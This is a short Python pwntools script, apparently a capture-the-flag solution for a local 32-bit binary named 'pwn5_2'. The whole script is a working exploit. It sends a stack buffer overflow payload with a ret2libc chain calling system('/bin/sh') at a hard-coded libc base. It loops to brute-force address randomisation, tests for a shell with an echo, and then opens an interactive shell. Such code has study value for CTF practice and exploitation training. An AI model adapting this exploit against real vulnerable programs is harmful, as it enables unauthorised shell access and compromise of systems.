from pwn import *
#context.log_level = 'debug'
# baoli
libc = ELF('/lib32/libc.so.6')
p_system = 0xf75ab000 + libc.symbols['system']
p_binsh = 0xf75ab000 + libc.search('/bin/sh').next()

while 1:
	cn = process('./pwn5_2')
	pay = 'a'*0x28 + 'bbbb' + p32(p_system) +'bbbb' + p32(p_binsh)
	cn.send(pay)
	try:
		cn.sendline('echo aaaaa')
		echo = cn.recv()[:4]
		print echo
	except:
		print 'try fail'
		cn.close()
		continue
	if echo == 'aaaa':
		cn.interactive()
	print 'got end'
	cn.close()

